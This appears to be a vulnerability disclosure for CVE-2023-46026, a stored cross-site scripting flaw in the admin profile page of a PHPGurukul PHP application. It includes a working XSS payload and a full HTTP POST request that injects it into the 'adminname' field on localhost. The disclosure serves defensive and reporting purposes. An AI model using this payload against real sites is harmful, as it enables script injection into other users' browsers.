# CVE-2023-46026-PHPGurukul-Teacher-Subject-Allocation-Management-System-1.0-Stored-Cross-Site-Scripting-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql
# Software Link
+ https://phpgurukul.com/?sdm_process_download=1&download_id=17645
# Overview
+ PHPGurukul Teacher Subject Allocation Management System is susceptible to a critical security vulnerability involving Stored Cross-Site Scripting (XSS) through 'adminname' and 'email' parameters in the /profile.php file. The application fails to adequately sanitize user-supplied data, allowing attackers to inject malicious scripts into the application. This could lead to the execution of arbitrary script code in the browsers of unsuspecting users, potentially compromising their security and privacy within the context of the affected site.
# Vulnerability Details
+ CVE ID: CVE-2023-46026
+ Affected Version: PHPGurukul Teacher Subject Allocation Management System V1.0
+ Vulnerable File: profile.php
+ Parameters: adminname, email
+ Attack Type: local
# Description
+ The parameters adminname and email in the profile.php file of PHPGurukul Teacher Subject Allocation Management System V1.0 are susceptible to Stored Cross-Site Scripting (XSS). This vulnerability arises due to insufficient input validation and sanitation of user-supplied data. An attacker can exploit this weakness by injecting malicious scripts into these parameters, which, when stored on the server, may be executed when other users view the affected user's profile.
# Proof of Concept (PoC) : 
+ Go to the admin profile page and click to Submit button to update
+ Intercept the POST request to profile.php via Burp Suite
+ Inject the payload to the vulnerable parameters
+ Payload: `"><svg/onload=alert(document.domain)>`
+ Example request for `adminname` parameter
```
POST /Tsas/admin/profile.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://localhost
Connection: close
Referer: http://localhost/Tsas/admin/profile.php
Cookie: PHPSESSID=<some-cookie-value>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

adminname=SuperAdmin"><svg/onload=alert(document.domain)>&username=admin&email=admin%40gmail.com&mobilenumber=5689784592&submit=
```
+ Go to the profile page and trigger the XSS --> `http://localhost/Tsas/admin/profile.php`
<img width="1447" alt="image" src="https://github.com/ersinerenler/phpgurukul-Teacher-Subject-Allocation-Management-System-1.0/assets/113091631/cbcd8230-be94-46c0-b4b9-3ee73193bbdb">
